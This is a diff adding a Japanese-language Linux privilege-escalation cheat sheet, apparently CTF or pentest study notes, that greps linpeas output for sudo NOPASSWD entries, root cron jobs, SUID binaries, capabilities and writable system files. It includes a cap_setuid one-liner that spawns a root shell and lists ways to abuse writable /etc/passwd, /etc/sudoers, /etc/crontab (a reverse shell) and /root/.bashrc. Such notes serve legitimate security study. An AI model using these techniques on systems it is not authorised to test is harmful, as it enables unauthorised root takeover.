@@ -164,3 +164,98 @@ cap_setuid がある → 即使える
         ↓ なければ
 /etc/passwd や /etc/sudoers に書き込める → 即使える
 ```
+
+# linpeas grep チートシート
+
+判断フローチャートの順番に確認する。
+
+---
+
+## 事前準備　出力をファイルに保存
+
+```bash
+./linpeas.sh | tee /tmp/out.txt
+```
+
+---
+
+## ① sudo
+
+```bash
+grep -A 10 "Sudo version\|NOPASSWD\|sudoers" /tmp/out.txt
+```
+
+**使える** → `NOPASSWD` の横のコマンドを GTFOBins で検索
+
+---
+
+## ② Cron
+
+```bash
+grep -A 20 "Cron jobs" /tmp/out.txt
+```
+
+**使える** → root が実行しているスクリプトのパスをメモして③へ
+
+---
+
+## ③ Cron で見つけたスクリプトに書き込めるか
+
+```bash
+# ② で見つけたパスを確認
+ls -la /見つけたパス
+
+# 書き込み権限があるか（w が自分のところにあるか）
+# -rwxr-xr-x  → 書き込めない
+# -rwxrwxr-x  → 書き込める ← 使える
+```
+
+---
+
+## ④ SUID
+
+```bash
+grep -A 30 "SUID\|SGID" /tmp/out.txt
+```
+
+**使える** → `/opt` `/home` `/tmp` 以下の見慣れないバイナリを GTFOBins で検索
+
+---
+
+## ⑤ Capabilities
+
+```bash
+grep -A 10 "Capabilities" /tmp/out.txt
+```
+
+**使える** → `cap_setuid` または `cap_sys_admin` が出たら即 root
+
+```bash
+# cap_setuid の悪用例
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+---
+
+## ⑥ 書き込み可能な重要ファイル
+
+```bash
+grep -E "/etc/passwd|/etc/sudoers|/etc/crontab|/root/" /tmp/out.txt
+```
+
+**使える** → 以下のファイルが出たら即 root
+
+| ファイル | 攻略方法 |
+|---|---|
+| `/etc/passwd` | パスワードなしの root ユーザーを追加 |
+| `/etc/sudoers` | 自分に NOPASSWD を追加 |
+| `/etc/crontab` | リバースシェルを追記 |
+| `/root/.bashrc` | root ログイン時に実行されるコマンドを追記 |
+
+---
+
+## まとめて一気に確認
+
+```bash
+grep -E "NOPASSWD|Cron jobs|cap_setuid|cap_sys_admin|/etc/passwd|/etc/sudoers|SUID" /tmp/out.txt
+```
